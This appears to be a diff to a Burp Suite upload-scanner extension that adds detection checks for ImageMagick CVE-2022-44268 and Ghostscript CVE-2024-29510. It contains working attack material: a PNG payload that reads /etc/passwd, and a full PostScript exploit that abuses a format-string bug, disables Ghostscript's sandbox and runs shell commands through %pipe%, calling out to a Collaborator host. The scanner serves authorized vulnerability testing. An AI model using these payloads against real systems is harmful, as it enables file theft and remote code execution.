@@ -1068,6 +1068,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                 self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
                 self._imagetragick_cve_2016_3714_sleep(injector)
                 self._bad_manners_cve_2018_16323(injector)
+                self._imagemagick_cve_2022_44268(injector)
             # Magick (ImageMagick and GraphicsMagick) - generic, as these are exploiting features
             if injector.opts.modules['magick'].isSelected():
                 print "\nDoing Image-/GraphicsMagick checks"
@@ -1458,7 +1459,379 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                 colabs.extend(self._send_collaborator(injector, burp_colab, types, basename, content, issue, replace=replace))
 
         return colabs
+        
+    def _imagemagick_cve_2022_44268(self, injector):
+        def _read_ztxt_chunk_from_png(imgdata):
+            image = BytesIO(imgdata)
+            signature = image.read(8)
 
+            if signature != struct.pack('8B', 137, 80, 78, 71, 13, 10, 26, 10):
+                print('Not a PNG file')
+                return
+
+            while True:
+                header = image.read(8)
+                length, type = struct.unpack('!I4s', header)
+
+                if type == b'IEND':
+                    return
+
+                data = image.read(length)
+                crc = image.read(4)
+
+                if type == b'zTXt':
+                    items = data.split(b'\x00', 2)
+
+                    chunk_data = zlib.decompress(items[-1]).decode('utf-8').split('\n')
+                    result = bytes(bytearray.fromhex(''.join(chunk_data[3:]))).decode('utf-8')
+
+                    return result
+
+
+        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "ImEtcPasswd"
+        content = 'iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAYAAACtWK6eAAAAE3RFWHRwcm9maWxlAC9ldGMvcGFz' \
+                    'c3dkRlvXWAAABh1JREFUeAHt09tu4zgQRdHM/3/0zLwIcLuFyKIpsi6r0YBjRWSd2if7n39/fv7/' \
+                    '/+MfAgicECDICRSPEDgIEOQg4ROBEwIEOYHiEQIHAYIcJHwicELgQUFOpnmEQDICBElWmLhrCRBk' \
+                    'LW/TkhEgSLLCxF1LgCBreZuWjEBOQZJBFjcvAYLk7U7yBQQIsgCyEXkJECRvd5IvIECQBZCNyEuA' \
+                    'IG/d+YrAKwGCvNLwMwJvBAjyBsRXBF4JEOSVhp8ReCNAkDcgviLwSoAgrzSe/dntCQkQJGFpIq8j' \
+                    'QJB1rE1KSIAgCUsTeR0BgqxjbVJCAgRJWNrfkT15igBBniLr3hIECFKiRks8RYAgT5F1bwkCBClR' \
+                    'oyWeIkCQp8hWubf5HgRp/gdg/d8JEOR3Pn7bnABBmv8BWP93AgT5nY/fNidAkOZ/ADvXzzCbIBla' \
+                    'knEbAYJsQ29wBgIEydCSjNsIEGQbeoMzECBIhpZkvEtg2vsEmYbSRRUJEKRiq3aaRoAg01C6qCIB' \
+                    'glRs1U7TCBBkGkoXVSTwtyAVt7QTAoMECDIIzrEeBAjSo2dbDhIgyCA4x3oQIEiPnm05SGCpIIMZ' \
+                    'HUNgGwGCbENvcAYCBMnQkozbCBBkG3qDMxAgSIaWZNxGoIog2wAaXJsAQWr3a7svCRDkS4CO1yZA' \
+                    'kNr92u5LAgT5EqDjtQkQ5LJfL3QmQJDO7dv9kgBBLhF5oTMBgnRu3+6XBAhyicgLnQkQZGf7Zocn' \
+                    'QJDwFQm4kwBBdtI3OzwBgoSvSMCdBAiyk77Z4QkQJHxFYwGdmkOAIHM4uqUoAYIULdZacwgQZA5H' \
+                    'txQlQJCixVprDgGCzOHY6ZZWuxKkVd2WvUuAIHeJeb8VAYK0qtuydwkQ5C4x77ciQJBWdUdfNl4+' \
+                    'gsTrRKJABAgSqAxR4hEgSLxOJApEgCCByhAlHgGCxOtEoicIDN5JkEFwjvUgQJAePdtykABBBsE5' \
+                    '1oMAQXr0bMtBAgQZBOdYDwKfCNKDhC0ROCFAkBMoHiFwECDIQcInAicECHICxSMEDgIEOUj4ROCE' \
+                    'wGZBThJ5hEAgAgQJVIYo8QgQJF4nEgUiQJBAZYgSjwBB4nUiUSACdQUJBFmUvAQIkrc7yRcQIMgC' \
+                    'yEbkJUCQvN1JvoAAQRZANiIvAYIMdOdIHwIE6dO1TQcIEGQAmiN9CBCkT9c2HSBAkAFojvQhQJBY' \
+                    'XUsTjABBghUiTiwCBInVhzTBCBAkWCHixCJAkFh9SBOMAEGCFfJcHDePECDICDVn2hAgSJuqLTpC' \
+                    'gCAj1JxpQ4Agbaq26AgBgoxQc+ZPAoW/EaRwuVb7ngBBvmfohsIECFK4XKt9T4Ag3zN0Q2ECBClc' \
+                    'boXVdu9AkN0NmB+aAEFC1yPcbgIE2d2A+aEJECR0PcLtJkCQ3Q2Yv4vAR3MJ8hEmL3UlQJCuzdv7' \
+                    'IwIE+QiTl7oSIEjX5u39EQGCfITJS10JjAnSlZa92xEgSLvKLXyHAEHu0PJuOwIEaVe5he8QIMgd' \
+                    'Wt5tRyCcIO0asHBoAgQJXY9wuwkQZHcD5ocmQJDQ9Qi3mwBBdjdgfmgCnQQJXYRwMQkQJGYvUgUh' \
+                    'QJAgRYgRkwBBYvYiVRACBAlShBgxCRBkSi8uqUqAIFWbtdcUAgSZgtElVQkQpGqz9ppCgCBTMLqk' \
+                    'KgGCRG9Wvq0ECLIVv+HRCRAkekPybSVAkK34DY9OgCDRG5JvKwGCbMW/d7jp1wQIcs3IG40JEKRx' \
+                    '+Va/JkCQa0beaEyAII3Lt/o1AYJcM/LGfQJlThCkTJUWeYIAQZ6g6s4yBAhSpkqLPEGAIE9QdWcZ' \
+                    'AgQpU2WXRdbuSZC1vE1LRoAgyQoTdy0BgqzlbVoyAgRJVpi4awkQZC1v0yITOMlGkBMoHiFwECDI' \
+                    'QcInAicECHICxSMEDgIEOUj4ROCEAEFOoHiEwEFgliDHfT4RKEWAIKXqtMxsAgSZTdR9pQgQpFSd' \
+                    'lplNgCCzibqvFIEEgpTibZlkBAiSrDBx1xIgyFrepiUjQJBkhYm7lgBB1vI2LRmB3oIkK0vc9QQI' \
+                    'sp65iYkIECRRWaKuJ0CQ9cxNTESAIInKEnU9AYI8xNy1NQj8B6fhj0izycXRAAAAAElFTkSuQmCC'
+        content = content.decode("base64")
+
+        urrs = self._send_simple(injector, {('', '.png', 'image/png')}, basename, content, redownload=True)
+        for urr in urrs:
+            if urr and urr.download_rr:
+                resp = urr.download_rr.getResponse()
+                if resp:
+                    resp = FloydsHelpers.jb2ps(resp).split("\r\n\r\n", 1)[1]
+
+                    result = _read_ztxt_chunk_from_png(resp)
+
+                    if result and BurpExtender.REGEX_PASSWD.match(result.split('\n')[0]):
+                        name = "ImageMagick Local File Include"
+                        severity = "High"
+                        confidence = "Firm"
+
+                        detail = "A passwd-like response was downloaded when uploading a PNG file with a payload that " \
+                                 "tries to include /etc/passwd. Therefore arbitrary file read seems possible. " \
+                                 "See https://nvd.nist.gov/vuln/detail/CVE-2022-44268 for details. " \
+                                 "Extracted content: <br><br><pre>" + result + '</pre>'
+                        issue = self._create_issue_template(injector.get_brr(), name + " CVE-2022-44268", detail, confidence, severity)
+                        issue.httpMessagesPy = [urr.upload_rr, urr.download_rr]
+                        self._add_scan_issue(issue)
+
+    def _ghostscript_cve_2024_29510():
+        return """
+%!PS-Adobe-3.0 EPSF-3.0
+%%Pages: 1
+%%BoundingBox:   36   36  576  756
+%%LanguageLevel: 1
+%%EndComments
+%%BeginProlog
+%%EndProlog
+
+
+% ====== Configuration ======
+
+% Offset of `gp_file *out` on the stack
+/IdxOutPtr 5 def
+
+
+% ====== General Postscript utility functions ======
+
+% from: https://github.com/scriptituk/pslutils/blob/master/string.ps
+/cat {
+	exch
+	dup length 2 index length add string
+	dup dup 5 2 roll
+	copy length exch putinterval
+} bind def
+
+% from: https://rosettacode.org/wiki/Repeat_a_string#PostScript
+/times {
+  dup length dup    % rcount ostring olength olength
+  4 3 roll          % ostring olength olength rcount
+  mul dup string    % ostring olength flength fstring
+  4 1 roll          % fstring ostring olength flength
+  1 sub 0 3 1 roll  % fstring ostring 0 olength flength_minus_one 
+  {                 % fstring ostring iter
+    1 index 3 index % fstring ostring iter ostring fstring
+    3 1 roll        % fstring ostring fstring iter ostring
+    putinterval     % fstring ostring
+  } for
+  pop               % fstring
+} def
+
+% Printing helpers
+/println { print (\012) print } bind def
+/printnumln { =string cvs println } bind def
+
+% ====== Start of exploit helper code ======
+
+% Make a new tempfile but only save its path. This gives us a file path to read/write 
+% which will exist as long as this script runs. We don't actually use the file object
+% (hence `pop`) because we're passing the path to uniprint and reopening it ourselves.
+/PathTempFile () (w+) .tempfile pop def
+
+
+% Convert hex string "4142DEADBEEF" to padded little-endian byte string <EFBEADDE42410000>
+% <HexStr> str_ptr_to_le_bytes <ByteStringLE>
+/str_ptr_to_le_bytes {
+	% Convert hex string argument to Postscript string
+	% using <DEADBEEF> notation
+	/ArgBytes exch (<) exch (>) cat cat token pop exch pop def
+
+	% Prepare resulting string (`string` fills with zeros)
+	/Res 8 string def
+
+	% For every byte in the input
+	0 1 ArgBytes length 1 sub {
+		/i exch def
+
+		% put byte at index (len(ArgBytes) - 1 - i)
+		Res ArgBytes length 1 sub i sub ArgBytes i get put
+	} for
+
+	Res % return
+} bind def
+
+
+% <StackString> <FmtString> do_uniprint <LeakedData>
+/do_uniprint {
+	/FmtString exch def
+	/StackString exch def
+
+	% Select uniprint device with our payload
+	<<
+		/OutputFile PathTempFile
+		/OutputDevice /uniprint
+		/upColorModel /DeviceCMYKgenerate
+		/upRendering /FSCMYK32
+		/upOutputFormat /Pcl
+		/upOutputWidth 99999
+		/upWriteComponentCommands {(x)(x)(x)(x)} % This is required, just put bogus strings
+		/upYMoveCommand FmtString
+	>>
+	setpagedevice
+	
+	% Manipulate the interpreter to put a recognizable piece of data on the stack
+	(%%__) StackString cat .runstring
+
+	% Produce a page with some content to trigger uniprint logic
+	newpath 1 1 moveto 1 2 lineto 1 setlinewidth stroke
+	showpage
+
+	% Read back the written data
+	/InFile PathTempFile (r) file def
+	/LeakedData InFile 4096 string readstring pop def
+	InFile closefile
+
+	LeakedData % return
+} bind def
+
+
+% get_index_of_controllable_stack <Idx>
+/get_index_of_controllable_stack {
+	% A recognizable token on the stack to search for
+	/SearchToken (ABABABAB) def
+
+	% Construct "1:%lx,2:%lx,3:%lx,...,400:%lx,"
+	/FmtString 0 string 1 1 400 { 3 string cvs (:%lx,) cat cat } for def
+
+	SearchToken FmtString do_uniprint
+
+	% Search for ABABABAB => 4241424142414241 (assume LE)
+	(4241424142414241) search {
+		exch pop
+		exch pop
+		% <pre> is left
+
+		% Search for latest comma in <pre> to get e.g. `123:` as <post>
+		(,) rsearch pop pop pop
+
+		% Search for colon and use <pre> to get `123`
+		(:) search pop exch pop exch pop
+
+		% return as int
+		cvi
+	} {
+		(Could not find our data on the stack.. exiting) println
+		quit
+	} ifelse
+} bind def
+
+
+% <StackIdx> <AddrHex> write_to
+/write_to {
+	/AddrHex exch str_ptr_to_le_bytes def % address to write to
+	/StackIdx exch def % stack idx to use
+
+	/FmtString StackIdx 1 sub (%x) times (_%ln) cat def
+
+	AddrHex FmtString do_uniprint
+
+	pop % we don't care about formatted data
+} bind def
+
+
+% <StackIdx> read_ptr_at <PtrHexStr>
+/read_ptr_at {
+	/StackIdx exch def % stack idx to use
+
+	/FmtString StackIdx 1 sub (%x) times (__%lx__) cat def
+
+	() FmtString do_uniprint
+
+	(__) search pop pop pop (__) search pop exch pop exch pop
+} bind def
+
+
+% num_bytes <= 9
+% <StackIdx> <PtrHex> <NumBytes> read_dereferenced_bytes_at <ResultAsMultipliedInt>
+/read_dereferenced_bytes_at {
+	/NumBytes exch def
+	/PtrHex exch def
+	/PtrOct PtrHex str_ptr_to_le_bytes def % address to read from
+	/StackIdx exch def % stack idx to use
+
+	/FmtString StackIdx 1 sub (%x) times (__%.) NumBytes 1 string cvs cat (s__) cat cat def
+
+	PtrOct FmtString do_uniprint
+
+	/Data exch (__) search pop pop pop (__) search pop exch pop exch pop def
+
+	% Check if we were able to read all bytes
+	Data length NumBytes eq {
+		% Yes we did! So return the integer conversion of the bytes
+		0 % accumulator
+		NumBytes 1 sub -1 0 {
+			exch % <i> <accum>
+			256 mul exch % <accum*256> <i>
+			Data exch get % <accum*256> <Data[i]>
+			add % <accum*256 + Data[i]>
+		} for
+	} {
+		% We did not read all bytes, add a null byte and recurse on addr+1
+		StackIdx 1 PtrHex ptr_add_offset NumBytes 1 sub read_dereferenced_bytes_at
+		256 mul
+	} ifelse
+} bind def
+
+
+% <StackIdx> <AddrHex> read_dereferenced_ptr_at <PtrHexStr>
+/read_dereferenced_ptr_at {
+	% Read 6 bytes
+	6 read_dereferenced_bytes_at
+
+	% Convert to hex string and return
+	16 12 string cvrs
+} bind def
+
+
+% <Offset> <PtrHexStr> ptr_add_offset <PtrHexStr>
+/ptr_add_offset {
+	/PtrHexStr exch def % hex string pointer
+	/Offset exch def % integer to add
+
+	/PtrNum (16#) PtrHexStr cat cvi def
+
+	% base 16, string length 12
+	PtrNum Offset add 16 12 string cvrs
+} bind def
+
+
+() println
+
+% ====== Start of exploit logic ======
+
+
+% Find out the index of the controllable bytes
+% This is around the 200-300 range but differs per binary/version
+/IdxStackControllable get_index_of_controllable_stack def
+(Found controllable stack region at index: ) print IdxStackControllable printnumln
+
+% Exploit steps:
+% - `gp_file *out` is at stack index `IdxOutPtr`.
+%
+% - Controllable data is at index `IdxStackControllable`.
+%
+% - We want to find out the address of: 
+%       out->memory->gs_lib_ctx->core->path_control_active
+%   hence we need to dereference and add ofsets a few times
+%
+% - Once we have the address of `path_control_active`, we use
+%   our write primitive to write an integer to its address - 3
+%   such that the most significant bytes (zeros) of that integer
+%   overwrite `path_control_active`, setting it to 0.
+%
+% - Finally, with `path_control_active` disabled, we can use
+%   the built-in (normally sandboxed) `%pipe%` functionality to
+%   run shell commands
+
+
+/PtrOut IdxOutPtr read_ptr_at def
+
+(out: 0x) PtrOut cat println
+
+
+% memory is at offset 144 in out
+/PtrOutOffset 144 PtrOut ptr_add_offset def
+/PtrMem IdxStackControllable PtrOutOffset read_dereferenced_ptr_at def
+
+(out->mem: 0x) PtrMem cat println
+
+% gs_lib_ctx is at offset 208 in memory
+/PtrMemOffset 208 PtrMem ptr_add_offset def
+/PtrGsLibCtx IdxStackControllable PtrMemOffset read_dereferenced_ptr_at def
+
+(out->mem->gs_lib_ctx: 0x) PtrGsLibCtx cat println
+
+% core is at offset 8 in gs_lib_ctx
+/PtrGsLibCtxOffset 8 PtrGsLibCtx ptr_add_offset def
+/PtrCore IdxStackControllable PtrGsLibCtxOffset read_dereferenced_ptr_at def
+
+(out->mem->gs_lib_ctx->core: 0x) PtrCore cat println
+
+% path_control_active is at offset 156 in core
+/PtrPathControlActive 156 PtrCore ptr_add_offset def
+
+(out->mem->gs_lib_ctx->core->path_control_active: 0x) PtrPathControlActive cat println
+
+% Subtract a bit from the address to make sure we write a null over the field
+/PtrTarget -3 PtrPathControlActive ptr_add_offset def
+
+% And overwrite it!
+IdxStackControllable PtrTarget write_to
+
+
+% And now `path_control_active` == 0, so we can use %pipe%
+
+(%pipe%{} {}) (r) file
+
+quit
+"""
     def _ghostscript(self, injector, burp_colab):
 
         # CVE-2016-7977
@@ -1509,6 +1882,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
 
         # CVE-2016-7976 with OutputICCProfile pipe technique
         # CVE-2017-8291 with OutputFile pipe technique
+        # CVE-2024-29510
         # TODO feature: look at ghostbutt.com and metasploit implementation and see how they are doing it
         name = "Ghostscript RCE"
         severity = "High"
@@ -1544,7 +1918,6 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                          "{{ legal }} stopped {{ pop }} if\n" \
                          "restore\n" \
                          "mark /{} (%pipe%{} {}) currentdevice putdeviceprops"
-
         content_centos = "%!PS\n" \
                          "userdict /setpagedevice undef\n" \
                          "legal\n" \
@@ -1592,18 +1965,29 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             return []
         colab_tests = []
 
+        techniques += (
+            ("", "CVE-2024-29510", self._ghostscript_cve_2024_29510()),
+        )
+
         # Colab based
         for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
             for param, reference, content in techniques:
                 details = base_detail + detail_colab.format(param, reference, cmd)
                 issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
-                attack = content.format(
-                    #injector.opts.image_width,
-                    #injector.opts.image_height,
-                    param,
-                    cmd,
-                    server
-                )
+                attack = content
+                if param != "":
+                    attack = content.format(
+                        #injector.opts.image_width,
+                        #injector.opts.image_height,
+                        param,
+                        cmd,
+                        server
+                    )
+                else:
+                    attack = content.format(
+                        cmd,
+                        server
+                    )
                 colab_tests.extend(self._send_collaborator(injector, burp_colab, self.GS_TYPES, basename + param + cmd_name,
                                                            attack, issue, replace=replace, redownload=True))
 
